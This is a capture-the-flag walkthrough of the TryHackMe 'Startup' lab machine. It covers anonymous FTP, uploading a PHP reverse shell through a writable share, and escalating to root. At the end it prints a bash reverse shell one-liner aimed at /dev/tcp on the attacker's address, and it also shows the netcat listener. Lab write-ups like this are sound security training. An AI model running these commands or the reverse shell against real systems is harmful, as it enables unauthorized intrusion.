---
title: "Startup Writeup THM"
description: "My writeup of the TryHackMe room [Startup](https://tryhackme.com/room/Startup)"
date: 2024-01-07
image: https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
categories:
    - Room
    - Easy
---

I will start with a nmap scan:

```bash
nmap -sC -sV 10.10.107.18

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 15:17 EST
Nmap scan report for 10.10.107.18
Host is up (0.062s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.65.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

First of all we see that in the ftp server allows Anonymous login and that there are 2 file in it.

I will start with that:

```bash
ftp 10.10.107.18

Connected to 10.10.107.18.
220 (vsFTPd 3.0.3)
Name (10.10.107.18:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56482|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

```bash
cat notice.txt

Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

We now have a name, Maya.

The site doesn’t tell us much:

![Untitled](https://raw.githubusercontent.com/Blueaulo/Startup-writeup-THM/main/91426f10-815e-4dce-8275-a7e4a86904b0_Export-603ed8d9-2b1a-49ce-8213-7061cce6ff07/Startup%2009519d3a5bfc4be5bd4c3ca84ece9361/Untitled.png)

So I started a directory fuzzer:

```bash
ffuf -u http://10.10.107.18/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.107.18/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2807ms]
files                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 172ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 66ms]
:: Progress: [20469/20469] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

I discovered the files directory which is the ftp share:

Maybe we can upload a php revshell with ftp.

We have write access in the ftp folder:

```bash

ftp> cd ftp
250 Directory successfully changed.
ftp> put php.php
local: php.php remote: php.php
229 Entering Extended Passive Mode (|||40969|)
150 Ok to send data.
100% |***************************************************************************************************|  3461       70.22 MiB/s    00:00 ETA
226 Transfer complete.
3461 bytes sent in 00:00 (6.92 KiB/s)
ftp>
```

I uploaded my pentester monkey php reverse shell



```bash
nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.107.18] 40798
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:52:55 up 37 min,  0 users,  load average: 0.00, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

And we got a shell!

```bash
which python
/usr/bin/python
python -c 'import pty; pty.spawn ("/bin/bash")'
www-data@startup:/$
```

I also spawned a nicer shell with the help of python.

apart from the recipe, in the home directory there are also a vagrant directory, which appears to be a home directory, and an incidents directory:

```bash
ls

bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
```

In the incidents there is a pcapng file which we can read with wireshark, I downloaded the file uploading it in the ftp directory:

```bash
cp suspicious.pcapng /var/www/html/files/ftp
```

From here I looked up the traffic and found out that lennie, tried to login with his credentials with the www-data account:

```bash
Sorry, try again.
[sudo] password for www-data: <redacted>
```

So I tried logging in and it worked:

```bash
www-data@startup:/incidents$ su lennie
Password: <redacted>

lennie@startup:/incidents$
```

I then grabbed the user flag, and discovered a file in the etc folder that I owned that it was executed from root, I edited it with this and got a root shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.11.65.91/5555 0>&1
```
